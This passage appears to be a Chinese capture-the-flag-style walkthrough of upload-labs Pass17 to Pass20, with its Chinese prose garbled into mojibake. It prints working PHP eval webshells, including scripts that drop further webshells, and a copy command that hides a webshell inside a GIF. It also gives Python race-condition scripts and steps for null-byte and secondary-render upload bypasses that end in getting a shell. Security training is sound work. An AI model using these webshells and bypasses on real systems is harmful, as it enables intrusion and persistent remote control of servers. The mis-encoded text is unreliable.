    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å
    $fileext= substr(strrchr($filename,"."),1);

    //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼";
                @unlink($target_path);
            }else{
                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "ä¸Šä¼ å‡ºé”™ï¼";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼";
                @unlink($target_path);
            }else{
                 //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
                srand(time());
                $newfilename = strval(rand()).".png";
                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "ä¸Šä¼ å‡ºé”™ï¼";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼";
                @unlink($target_path);
            }else{
                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
                srand(time());
                $newfilename = strval(rand()).".gif";
                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "ä¸Šä¼ å‡ºé”™ï¼";
        }
    }else{
        $msg = "åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼";
    }
}

~~~

![Pass17_02](./img/Pass17_02.PNG)



+ è¡¥å……åŸç†è¯´æ˜

~~~ tex
äºŒæ¬¡æ¸²æŸ“åŸç†ï¼š
â€ƒ â€ƒ åœ¨æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶åï¼Œç½‘ç«™ä¼šå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡å¤„ç†ï¼ˆæ ¼å¼ã€å°ºå¯¸è¦æ±‚ç­‰ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šæŠŠé‡Œé¢çš„å†…å®¹è¿›è¡Œæ›¿æ¢æ›´æ–°ï¼Œå¤„ç†å®Œæˆåï¼Œæ ¹æ®æˆ‘ä»¬åŸæœ‰çš„å›¾ç‰‡ç”Ÿæˆä¸€ä¸ªæ–°çš„å›¾ç‰‡å¹¶æ”¾åˆ°ç½‘ç«™å¯¹åº”çš„æ ‡ç­¾è¿›è¡Œæ˜¾ç¤ºã€‚
~~~

~~~ tex
ç»•è¿‡ï¼š
    é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼š
   â€ƒâ€ƒ   å°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°ç½‘ç«™äºŒæ¬¡å¤„ç†åçš„å›¾ç‰‡ä¸­ï¼Œä¹Ÿå°±æ˜¯æŠŠä¸€å¥è¯æ’å…¥å›¾ç‰‡åœ¨äºŒæ¬¡æ¸²æŸ“åä¼šä¿ç•™çš„é‚£éƒ¨åˆ†æ•°æ®é‡Œï¼Œç¡®ä¿     ä¸ä¼šåœ¨äºŒæ¬¡å¤„ç†æ—¶åˆ é™¤æ‰ã€‚è¿™æ ·äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ä¸­å°±å­˜åœ¨äº†ä¸€å¥è¯ï¼Œåœ¨é…åˆæ–‡ä»¶åŒ…å«æ¼æ´è·å–webshell;

    å¯ä»¥é…åˆæ¡ä»¶ç«äº‰ï¼š
â€ƒâ€ƒ      è¿™é‡ŒäºŒæ¬¡æ¸²æŸ“çš„é€»è¾‘å­˜åœ¨æ¼æ´ï¼Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ ï¼Œä¹‹åå†åˆ¤æ–­ï¼Œç¬¦åˆå°±ä¿å­˜ï¼Œä¸ç¬¦åˆåˆ é™¤ï¼Œå¯åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥è¿›è¡Œçˆ†ç ´     ä¸Šä¼ ;
~~~



+ ç½‘ä¸Šæ‰¾åˆ°ç´ æ<code>22.gif</code>ï¼Œç”¨<code>010Editor</code>è½¯ä»¶æ‰“å¼€è¯¥<code>gif</code>æ–‡ä»¶å¹¶æ˜¾ç¤ºä¸º16è¿›åˆ¶å’Œ2è¿›åˆ¶

![Pass17_03](./img/Pass17_03.PNG)



+ ä¸Šä¼ <code>22.gif</code>åˆ°ä¸Šä¼ ç‚¹

![Pass17_04](./img/Pass17_04.PNG)



+ æˆåŠŸä¸Šä¼ <code>22.gif</code>åˆ°ä¸Šä¼ ç‚¹

![Pass17_05](./img/Pass17_05.PNG)



+ å³é”®ï¼Œé€‰æ‹©åœ¨æ–°çš„é¡µé¢æ‰“å¼€å›¾åƒå³å¯

![Pass17_06](./img/Pass17_06.png)



+ æˆåŠŸåœ¨æ–°çš„é¡µé¢æ‰“å¼€å›¾åƒï¼Œå¤åˆ¶å›¾åƒçš„ç½‘å€

![Pass17_07](./img/Pass17_07.png)



+ å³é”®ï¼Œç‚¹å‡»å¦å­˜ä¸ºæ–¹å¼ä¿å­˜å›¾åƒä¸º<code>23.gif</code>

![Pass17_08](./img/Pass17_08.png)



+ æˆåŠŸä¿å­˜å›¾åƒ<code>23.gif</code>åˆ°æŒ‡å®šä½ç½®

![Pass17_09](./img/Pass17_09.PNG)



+ ç”¨<code>010Editor</code>æ‰“å¼€<code>22.gif</code>ï¼Œæœç´¢<code>22.gif</code>æ–‡ä»¶é‡Œçš„<code>php</code>ï¼Œå‘ç°ä»£ç æ³¨å…¥å¦‚ä¸‹

![Pass17_21](./img/Pass17_21.PNG)

![Pass17_12](./img/Pass17_12.png)



+ ç”¨<code>010Editor</code>æ‰“å¼€<code>23.gif</code>ï¼Œæœç´¢<code>23.gif</code>æ–‡ä»¶é‡Œçš„<code>php</code>

![Pass17_14](./img/Pass17_14.png)

![Pass17_13](./img/Pass17_13.png)

å‘ç°ç»è¿‡äºŒæ¬¡æ¸²æŸ“ä¹‹åï¼Œæ³¨å…¥çš„ä»£ç å¹¶æ²¡æœ‰è¢«æ›¿æ¢åˆ™ä»£ç å¯æˆåŠŸæ‰§è¡Œ



+ ç”¨<code>010Editor</code>æ‰“å¼€<code>22.gif</code>å’Œ<code>23.gif</code>ï¼Œå¹¶æ¯”è¾ƒä¸¤è€…çš„äºŒè¿›åˆ¶ä»£ç æœ‰ä»€ä¹ˆä¸åŒï¼Œå‘ç°åªæœ‰ä¸€ä¸ªæœ‰å·®å¼‚çš„åœ°æ–¹å…¶ä»–æ²¡å˜

![Pass17_10](./img/Pass17_10.png)

![Pass17_22](./img/Pass17_22.PNG)



+ æ‰“å¼€æ–‡ä»¶åŒ…å«æ¼æ´çš„é¡µé¢

![Pass17_16](./img/Pass17_16.png)



+ åœ¨æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢çš„ç½‘å€ååŠ ä¸Š<code>?file=å‰é¢å¤åˆ¶çš„å·²ä¸Šä¼ gifå›¾åƒçš„åœ°å€</code>ï¼Œå¹¶å›è½¦ï¼Œä»£ç æˆåŠŸæ‰§è¡Œ

![Pass17_17](./img/Pass17_17.png)



+ åœ¨èšå‰‘ä¸Šæ·»åŠ æ•°æ®å¹¶é…ç½®å¦‚ä¸‹

![Pass17_18](./img/Pass17_18.PNG)



+ ç‚¹å‡»æ·»åŠ ï¼ŒæˆåŠŸæ·»åŠ <code>shell</code>

![Pass17_19](./img/Pass17_19.PNG)



+ åŒå‡»æˆåŠŸæ·»åŠ çš„<code>shell</code>ï¼ŒæˆåŠŸ<code>getshell</code>

![Pass17_20](./img/Pass17_20.PNG)



## Pass18 æ¡ä»¶ç«äº‰ä¸€

+ æŸ¥çœ‹æç¤º

![Pass18_1](./img/Pass18_1.PNG)



+ æŸ¥çœ‹æºç ï¼Œå¦‚ä¸‹

~~~ shell
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼";
            unlink($upload_file);
        }
    }else{
        $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
    }
}
~~~

![Pass18_2](./img/Pass18_2.PNG)

â€‹        ä»æºç çœ‹ï¼ŒæœåŠ¡å™¨å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜ä¸‹æ¥ï¼Œç„¶åå°†æ–‡ä»¶çš„åç¼€ååŒç™½åå•å¯¹æ¯”ï¼›å¦‚æœæ˜¯<code>jpg</code>ã€<code>png</code>ã€<code>gif</code>ä¸­çš„ä¸€ç§å°±å°†æ–‡ä»¶é‡å‘½åï¼Œå¦‚æœä¸ç¬¦çš„è¯<code>unlink()</code>å‡½æ•°ä¼šåˆ é™¤è¯¥æ–‡ä»¶

â€‹        å¦‚æœè¿˜æ˜¯ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œè‹¥ç½‘ç«™ä¾æ—§å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´è¿˜å¯åˆ©ç”¨ï¼›å¦‚æœæ²¡æœ‰æ–‡ä»¶åŒ…å«æ¼æ´åˆ™åªèƒ½ä¸Šä¼ ä¸€ä¸ª<code>php</code>æœ¨é©¬è§£æè¿è¡Œï¼›

â€‹        é‚£æ€ä¹ˆæï¼Ÿä¸Šä¼ ä¸Šå»å°±è¢«åˆ é™¤äº†è¿˜æ€ä¹ˆè®¿é—®ï¼›ä¸æ…Œä¸æ…Œï¼Œä»£ç æ‰§è¡Œè¿‡ç¨‹éœ€è¦è€—è´¹æ—¶é—´äº†ï¼Œå¦‚æœèƒ½åœ¨ä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬è¢«åˆ é™¤å‰è®¿é—®å³å¯ï¼Œè¿™ä¸ªå«æ¡ä»¶ç«äº‰ä¸Šä¼ ç»•è¿‡ï¼›

â€‹         å¯åˆ©ç”¨<code>burp</code>å¤šçº¿ç¨‹å‘åŒ…ï¼Œç„¶åä¸æ–­åœ¨æµè§ˆå™¨è®¿é—®<code>webshell</code>ä¼šæœ‰ä¸€ç¬é—´çš„è®¿é—®æˆåŠŸï¼›



+ ç¼–å†™ä¸€å¥è¯æœ¨é©¬è„šæœ¬

~~~ php
<?php
    fputs(fopen('AttackScript.php','w'),'<?php @eval($_POST["EighteenSecond"])?>'); 
?>
~~~

æŠŠè¯¥<code>php</code>æ–‡ä»¶é€šè¿‡<code>burpsuite</code>ä¸åœé‡æ”¾ï¼Œç„¶åå†å†™<code>python</code>è„šæœ¬ä¸åœè®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ€»æœ‰ä¸€ç¬é—´æ˜¯è¿˜æ²¡æ¥å¾—åŠåˆ é™¤å°±å¯è¢«è®¿é—®åˆ°ï¼Œä¸€æ—¦è®¿é—®åˆ°è¯¥æ–‡ä»¶å°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª<code>AttackScript.php</code>çš„ä¸€å¥è¯ã€‚æ­£å¸¸æ¸—é€æµ‹è¯•ä¸­è¿™ä¹Ÿæ˜¯å¥½åŠæ³•ï¼Œå› ä¸ºå•çº¯è®¿é—®å¸¦æœ‰<code>phpinfo()</code>çš„æ–‡ä»¶æ²¡ä»€ä¹ˆæ•ˆæœï¼Œä¸€æ—¦åˆ é™¤è¿˜æ˜¯æ— æ³•åˆ©ç”¨ï¼›ä½†è¿™åŠæ³•ç”Ÿæˆçš„<code>AttackScript.php</code>æœåŠ¡å™¨ä¸åˆ é™¤ï¼Œå¯ç”¨èšå‰‘è¿æ¥

![Pass18_14](./img/Pass18_14.PNG)



+ ç¼–å†™è®¿é—®è„šæœ¬<code>AttackScript.py</code>

~~~ python
import requests
url = "http://192.168.31.126:8080/upload-labs/upload/EighteenSecondMethod.php"
while True:
    response = requests.get(url)
    if response.status_code == 200:
        print("ok")
        break
~~~

![Pass18_19](./img/Pass18_19.PNG)



+ ä¸Šä¼ <code>php</code>æ–‡ä»¶å¹¶ç”¨<code>burpsuite</code>æ‹¦æˆª

![Pass18_5](./img/Pass18_5.PNG)

![Pass18_6](./img/Pass18_6.PNG)



+ è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œå‰ä¸è¦æŠŠ<code>burpsuite</code>çš„æ‹¦æˆªåŠŸèƒ½å…³é—­äº†ï¼Œè¦ä¸€ç›´ä¿æŒæ‹¦æˆªçŠ¶æ€ä»¥è¾¾åˆ°æµ‹è¯•æ›´å¥½çš„æ•ˆæœï¼›ç„¶åå°†ä¸Šä¼ çš„è„šæœ¬å‘åˆ°æµ‹è¯•å™¨

![Pass18_7](./img/Pass18_7.PNG)



+ é…ç½®ä¸‹æµ‹è¯•å™¨ï¼Œç‚¹å‡»ä¸‹<code>$æ¸…é™¤</code>

![Pass18_8](./img/Pass18_8.png)



+ è®¾ç½®æ— é™å‘é€ç©ºçš„<code>payload</code>è®©å…¶ä¸€ç›´ä¸Šä¼ è¯¥æ–‡ä»¶

![Pass18_9](./img/Pass18_9.PNG)



+ æŠŠçº¿ç¨‹è®¾ç½®å¾—é«˜ä¸€ç‚¹åšåˆ°é«˜å¹¶å‘

![Pass18_10](./img/Pass18_10.png)



+ ç‚¹å‡»<code>å¼€å§‹æ”»å‡»</code>ä¸æ–­åœ°å‘é€<code>payload</code>

![Pass18_11](./img/Pass18_11.png)

![Pass18_12](./img/Pass18_12.PNG)

å¯ä»¥çœ‹åˆ°ä¸Šä¼ è¯¥æ–‡ä»¶çš„æ•°æ®åŒ…ä¸åœåœ°é‡æ”¾



+ BPæ”»å‡»çš„åŒæ—¶æˆ‘ä»¬ä¹Ÿè¿è¡Œ<code>python</code>è„šæœ¬<code>AttackScript.py</code>ï¼Œç›®çš„æ˜¯ä¸åœè®¿é—®<code>EighteenSecondMethod.php</code>ç›´åˆ°æˆåŠŸè®¿é—®åˆ°ä¸ºæ­¢ï¼Œå½“å‡ºç°`OK`è¯´æ˜è®¿é—®åˆ°äº†è¯¥æ–‡ä»¶ï¼Œé‚£ä¹ˆ<code>AttackScript.php</code>åº”è¯¥ä¹Ÿåˆ›å»ºæˆåŠŸäº†

![Pass18_13](./img/Pass18_13.PNG)



+ å°†<code>burpsuite</code>çš„æ‹¦æˆªåŠŸèƒ½è§£é™¤

![Pass18_15](./img/Pass18_15.png)



+ ç”¨èšå‰‘æ·»åŠ æ•°æ®å¹¶é…ç½®ï¼Œè¿™é‡Œçš„<code>url</code>æ˜¯<code>http://192.168.31.126:8080/upload-labs/upload/AttackScript.php</code>ï¼Œè¿æ¥å¯†ç æ˜¯<code>EighteenSecond</code>

![Pass18_16](./img/Pass18_16.png)



+ æˆåŠŸæ·»åŠ äº†<code>shell</code>

![Pass18_17](./img/Pass18_17.PNG)



+ åŒå‡»æ•°æ®åæˆåŠŸ<code>getshell</code>

![Pass18_18](./img/Pass18_18.PNG)



## Pass19 æ¡ä»¶ç«äº‰äºŒ

+ æŸ¥çœ‹æºç 

â€‹	<code>index.php</code>çš„ä»£ç å¦‚ä¸‹

~~~ shell
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = 'æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚';
            break; 
        case -1:
            $msg = 'è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚';
            break; 
        case -2:
            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚';
            break; 
        case -3:
            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚';
            break; 
        case -4:
            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚';
            break; 
        case -5:
            $msg = 'ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚';
            break; 
        case -6:
            $msg = 'æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚';
            break;      
        default:
            $msg = 'æœªçŸ¥é”™è¯¯ï¼';
            break;
    }
}
~~~



â€‹	<code>myupload.php</code>çš„ä»£ç å¦‚ä¸‹:

~~~ shell

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
~~~



+ <code>upload()</code>å‡½æ•°å¤§è‡´æ€è·¯å¦‚ä¸‹

~~~ tex
1. åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºhttp postæ–¹å¼ä¸Šä¼ 
2. å»ºç«‹æ–‡ä»¶å¤¹
3. ç™½åå•éªŒè¯åç¼€å
4. æ£€æŸ¥å¤§å°
5. æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨
6. ç§»åŠ¨ä¸´æ—¶æ–‡ä»¶åˆ°ä¸Šä¼ ç›®å½•
7. å¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½å

åŒæ ·çš„é€»è¾‘ç¼ºé™· ä¸è¿‡æ˜¯ç™½åå• ä¸Šä¼ è·¯å¾„ä¸å¯æ§åˆ¶ æ‰€ä»¥ä¸Šä¼ å«æœ‰æœ¨é©¬çš„ç™½åå•æ–‡ä»¶ é…åˆæ¡ä»¶ç«äº‰å’Œå…¶ä»–æ¼æ´æ¥å®ç°å†™å…¥æœ¨é©¬
~~~



+ ä½¿ç”¨æ­£ç¡®çš„ç‰ˆæœ¬

~~~ tex
ç™½åå•+æ¡ä»¶ç«äº‰+ApacheæœªçŸ¥åç¼€åè§£ææ¼æ´
ä¸Šä¼ ä¸€ä¸ªApacheä¸è¯†åˆ«çš„åç¼€å é€šè¿‡æ¡ä»¶ç«äº‰è®¿é—®phpæ–‡ä»¶ å†™å…¥æœ¨é©¬æˆåŠŸ
æ³¨æ„ApacheæœªçŸ¥åç¼€åè§£ææ¼æ´é€‚ç”¨ php ts ç‰ˆæœ¬ 
~~~

~~~ tex
ç”¨ç‰ˆæœ¬5.5.38çš„php
~~~

![Pass19_01](./img/Pass19_01.png)



+ ç¼–å†™è„šæœ¬

<code>php</code>è„šæœ¬<code>NineteenScript.php</code>ä»£ç å¦‚ä¸‹:

~~~ php
<?php
	fputs(fopen('script.php','w'),'<?php @eval($_POST["Nineteen"])?>');
?>
~~~



<code>gif</code>æ–‡ä»¶<code>NineteenFirst.gif</code>ä½¿ç”¨<code>Pass16</code>çš„<code>gif</code>æ–‡ä»¶

![Pass19_02](./img/Pass19_02.PNG)



ç„¶åä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ¶é€ å›¾ç‰‡é©¬

~~~ shell
copy NineteenFirst.gif/a + NineteenScript.php/b NineteenScript.gif
~~~

![Pass19_03](./img/Pass19_03.PNG)



å¯çœ‹åˆ°å›¾ç‰‡<code>NineteenScript.gif</code>æˆåŠŸæ³¨å…¥æœ¨é©¬

![Pass19_04](./img/Pass19_04.PNG)



ç¼–å†™<code>python</code>è„šæœ¬<code>AttackScript.py</code>å¦‚ä¸‹:

~~~ python
import requests
from threading import Thread

#url = "http://192.168.31.126:80/upload-labs/upload/NineteenFirstMethod.php.html"
url = "http://192.168.31.128:80/upload-labs/include.php?file=upload/NineteenScript.gif"

def request():
    global StatusCode
    global Text
    html = requests.get(url)
    StatusCode = html.status_code
    Text = html.text
    
while True:
    t = Thread(target=request())
    t.start()
    if StatusCode == 200:
        print(Text)
        print("OK")
        break
    else:
        print(StatusCode)
~~~

![Pass19_05](./img/Pass19_05.PNG)



+ ä¸Šä¼ <code>NineteenScript.gif</code>æ–‡ä»¶åˆ°ç½‘ç«™

![Pass19_06](./img/Pass19_06.PNG)



+ ç”¨<code>burpsuite</code>æˆªæ–­

![Pass19_07](./img/Pass19_07.PNG)



+ å°†è¯·æ±‚å‘é€åˆ°æµ‹è¯•å™¨

![Pass19_08](./img/Pass19_08.PNG)



+ é…ç½®æµ‹è¯•çš„æ”»å‡»

![Pass19_09](./img/Pass19_09.png)

![Pass19_10](./img/Pass19_10.png)

![Pass19_11](./img/Pass19_11.png)



+ æµ‹è¯•å™¨å¼€å§‹æ”»å‡»å¹¶è¿è¡Œ<code>python</code>è„šæœ¬<code>AttackScript.py</code>è¿›è¡Œæ¡ä»¶ç«äº‰

![Pass19_12](./img/Pass19_12.PNG)

![Pass19_13](./img/Pass19_13.PNG)

å¦‚ä¸Šå›¾ï¼Œ<code>python</code>è„šæœ¬<code>AttackScript.py</code>æˆåŠŸè¿ä¸Š<code>NineteenScript.gif</code>å¹¶åˆ›å»ºåå°è„šæœ¬<code>script.php</code>



+ é…ç½®èšå‰‘è¿æ¥

![Pass19_14](./img/Pass19_14.png)

æ³¨æ„ç”Ÿæˆçš„è„šæœ¬<code>script.php</code>åœ¨æ–‡ä»¶å¤¹<code>upload-labs</code>ä¸‹è€Œä¸æ˜¯æ–‡ä»¶å¤¹<code>upload</code>ä¸‹

![Pass19_16](./img/Pass19_16.png)



+ å°†<code>burpsuite</code>è§£é™¤æˆªæ–­å¹¶æµ‹è¯•è¿æ¥ï¼Œæœ€ç»ˆæˆåŠŸ<code>getshell</code>

![Pass19_15](./img/Pass19_15.PNG)



## Pass20

+ é¦–å…ˆæŸ¥çœ‹æç¤º

![Pass20_01](./img/Pass20_01.PNG)



+ æŸ¥çœ‹æºä»£ç 

~~~ shell
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        }else{
            $msg = 'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼';
        }

    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
~~~

![Pass20_02](./img/Pass20_02.PNG)



+ äº§ç”Ÿæ¼æ´çš„ä»£ç 

~~~ shell
$_POSTä¼ å‚å¯¼è‡´æ–‡ä»¶ä¸Šä¼ è·¯å¾„å¯æ§

$file_name = $_POST['save_name'];
$img_path = UPLOAD_PATH . '/' .$file_name;
~~~



å¯åˆ©ç”¨çš„æ–¹æ³•å¾ˆå¤š

~~~ shell
.user.iniç»•è¿‡â€”â€”Pass05
å¤§å°å†™ç»•è¿‡â€”â€”Pass06
æœ«å°¾åŠ ç©ºæ ¼æˆ–ç‚¹æˆ–::$DATAç»•è¿‡â€”â€”Pass07ã€08ã€09
apacheå¤šåç¼€è§£æç»•è¿‡
POSTå‹00æˆªæ–­ç»•è¿‡
~~~



+ åŸç†

~~~ tex
æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶åšåˆ¤æ–­ï¼Œåªå¯¹ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶ååšåˆ¤æ–­
åç¼€åé»‘åå•
ä¸Šä¼ çš„æ–‡ä»¶åç”¨æˆ·å¯æ§
é»‘åå•ç”¨äºç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶åç¼€åè¿›è¡Œåˆ¤æ–­
move_uploaded_file()è¿˜æœ‰è¿™ä¹ˆä¸€ä¸ªç‰¹æ€§ï¼Œä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ /.
~~~



+ ç¼–å†™è„šæœ¬<code>TwentyFirstMethod.php</code>

~~~ php
<?php
	@eval($_POST['TwentyFirst']);
?>
~~~



+ ä¸Šä¼ è„šæœ¬<code>TwentyFirstMethod.php</code>åˆ°ç½‘ç«™

![Pass20_03](./img/Pass20_03.PNG)



+ ä¸Šä¼ æ–‡ä»¶ï¼Œæ–‡ä»¶åç”¨%00æˆªæ–­ï¼ŒæŠ“åŒ…è§£ç ï¼›ç”¨<code>burpsuite</code>æ‹¦æˆªå¹¶ä¿®æ”¹æ–‡ä»¶åå’Œå­˜å‚¨è·¯å¾„

![Pass20_04](./img/Pass20_04.PNG)

![Pass20_05](./img/Pass20_05.png)

